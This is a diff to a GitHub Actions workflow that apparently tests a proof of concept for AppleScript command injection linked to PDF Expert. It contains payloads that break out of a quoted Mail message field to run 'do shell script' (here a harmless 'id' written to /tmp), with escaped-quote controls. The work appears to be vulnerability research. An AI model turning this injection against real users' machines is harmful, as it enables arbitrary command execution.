@@ -6,82 +6,68 @@ on:
 jobs:
   poc:
     runs-on: macos-latest
-    timeout-minutes: 25
+    timeout-minutes: 20
     steps:
       - uses: actions/checkout@v4
 
-      - name: Host
-        run: sw_vers; uname -m
-
-      - name: Fetch PDF Expert 1187 from the vendor feed
-        run: |
-          set -euo pipefail
-          curl -fsSL -o pex.zip https://downloads.pdfexpert.com/pem3/versions/1187/PDFExpert.zip
-          shasum -a 256 pex.zip | tee zip.sha256
-          unzip -q pex.zip -d app
-          ls -l "app/PDF Expert.app/Contents/MacOS/PDF Expert"
-
-      - name: Template literals present in the shipped bytes
-        run: python3 poc/verify_binary.py "app/PDF Expert.app/Contents/MacOS/PDF Expert"
-
-      - name: Build the script from the binary's own literals
-        run: |
-          set -euo pipefail
-          python3 poc/gen_poc.py --binary "app/PDF Expert.app/Contents/MacOS/PDF Expert" \
-            --cmd "id > /tmp/pdfe_pwned" --field body > generated.scpt
-          echo "--- wc ---"; wc -l generated.scpt
-          echo "--- numbered ---"; nl -ba generated.scpt
-          echo "--- tokenizer ---"; python3 poc/verify_tokenlevel.py generated.scpt
-          echo "--- compile check ---"
-          osacompile -o /tmp/gen.scpt generated.scpt && echo "COMPILE OK" || echo "COMPILE FAILED"
-
-      - name: DECISIVE - minimal script, same construction, same sink
+      - name: T0 do shell script baseline
         run: |
           set +e
-          rm -f /tmp/pdfe_mini
-          printf '%s\n' \
-            'tell application "Mail"' \
-            'set newMessage to make new outgoing message with properties {subject:"Invoice", content:"x" & do shell script "id > /tmp/pdfe_mini" & "" & linefeed & linefeed}' \
-            'end tell' > mini.scpt
-          nl -ba mini.scpt
-          osacompile -o /tmp/mini.scpt mini.scpt && echo "MINI COMPILE OK" || echo "MINI COMPILE FAILED"
-          osascript mini.scpt > mini.out 2>&1 &
-          PID=$!
-          for i in $(seq 1 20); do [ -s /tmp/pdfe_mini ] && break; sleep 1; done
-          kill $PID 2>/dev/null
-          echo "--- mini output ---"; cat mini.out
-          echo "--- mini marker ---"; cat /tmp/pdfe_mini 2>/dev/null
-          if [ -s /tmp/pdfe_mini ]; then echo "MINI PROOF: do shell script executed"; else echo "MINI NO PROOF"; fi
+          rm -f /tmp/t0
+          timeout 20 osascript -e 'do shell script "id > /tmp/t0"'
+          echo "exit=$?"
+          echo "T0=[$(cat /tmp/t0 2>/dev/null)]"
 
-      - name: NEGATIVE CONTROL - same line, quote escaped
+      - name: T1 injection inside a record, no Mail
         run: |
           set +e
-          rm -f /tmp/pdfe_ctl
-          printf '%s\n' \
-            'tell application "Mail"' \
-            'set newMessage to make new outgoing message with properties {subject:"Invoice", content:"x\" & do shell script \"id > /tmp/pdfe_ctl\" & \"" & linefeed & linefeed}' \
-            'end tell' > ctl.scpt
-          nl -ba ctl.scpt
-          osacompile -o /tmp/ctl.scpt ctl.scpt && echo "CTL COMPILE OK" || echo "CTL COMPILE FAILED"
-          osascript ctl.scpt > ctl.out 2>&1 &
-          PID=$!
-          for i in $(seq 1 15); do [ -s /tmp/pdfe_ctl ] && break; sleep 1; done
-          kill $PID 2>/dev/null
-          echo "--- ctl output ---"; cat ctl.out
-          if [ -s /tmp/pdfe_ctl ]; then echo "CONTROL FAILED: escaped payload executed"; else echo "CONTROL OK: escaped payload did not execute"; fi
+          rm -f /tmp/t1
+          printf '%s\n' 'set r to {subject:"Invoice", content:"x" & do shell script "id > /tmp/t1" & "" & linefeed & linefeed}' > t1.scpt
+          nl -ba t1.scpt
+          timeout 25 osascript t1.scpt
+          echo "exit=$?"
+          echo "T1=[$(cat /tmp/t1 2>/dev/null)]"
+
+      - name: T2 control escaped quote, no Mail
+        run: |
+          set +e
+          rm -f /tmp/t2
+          printf '%s\n' 'set r to {subject:"Invoice", content:"x\" & do shell script \"id > /tmp/t2\" & \"" & linefeed & linefeed}' > t2.scpt
+          nl -ba t2.scpt
+          timeout 25 osascript t2.scpt
+          echo "exit=$?"
+          echo "T2=[$(cat /tmp/t2 2>/dev/null)]"
+
+      - name: T3 Mail record bounded timeout
+        run: |
+          set +e
+          rm -f /tmp/t3
+          printf '%s\n' 'with timeout of 8 seconds' 'tell application "Mail"' 'set newMessage to make new outgoing message with properties {subject:"Invoice", content:"x" & do shell script "id > /tmp/t3" & "" & linefeed & linefeed}' 'end tell' 'end timeout' > t3.scpt
+          nl -ba t3.scpt
+          osacompile -o /tmp/t3c.scpt t3.scpt && echo "T3 COMPILE OK" || echo "T3 COMPILE FAILED"
+          timeout 40 osascript t3.scpt
+          echo "exit=$?"
+          echo "T3=[$(cat /tmp/t3 2>/dev/null)]"
+
+      - name: T4 Mail scriptability on this runner
+        run: |
+          set +e
+          ls -d /System/Applications/Mail.app 2>/dev/null && echo "Mail.app present" || echo "Mail.app MISSING"
+          timeout 30 osascript -e 'tell application "Mail" to get version'
+          echo "exit=$?"
+          pgrep -x Mail >/dev/null && echo "Mail running" || echo "Mail not running"
 
       - name: Collect
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: evidence
+          name: iso
           path: |
-            generated.scpt
-            mini.scpt
-            ctl.scpt
-            mini.out
-            ctl.out
-            zip.sha256
-            /tmp/pdfe_mini
-            /tmp/pdfe_ctl
+            t1.scpt
+            t2.scpt
+            t3.scpt
+            /tmp/t0
+            /tmp/t1
+            /tmp/t2
+            /tmp/t3
           if-no-files-found: warn
